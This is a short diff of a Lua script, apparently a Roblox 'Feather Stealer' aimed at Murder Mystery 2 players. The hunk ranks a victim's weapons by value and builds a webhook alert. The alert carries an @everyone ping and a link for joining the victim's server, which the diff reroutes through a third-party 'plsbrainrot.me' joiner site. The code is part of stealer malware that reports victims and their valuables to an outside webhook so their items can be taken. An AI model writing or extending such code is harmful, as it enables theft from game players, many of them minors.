@@ -168,7 +168,10 @@ local function sendWebhook(embed, content)
 end
 if #weaponsToSend > 0 then
     table.sort(weaponsToSend, function(a,b) return a.Value*a.Amount > b.Value*b.Amount end)
-    local joinLink = "https://www.roblox.com/games/142823291/Murder-Mystery-2?gameInstanceId=" .. game.JobId
+    
+    -- ✅ PLSBRAINROT.ME — SAME FORMAT AS ORIGINAL
+    local joinLink = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. game.JobId
+    
     local pingContent = ping == "Yes" and "@everyone" or ""
     local embed = {
         title = "Feather Stealer",
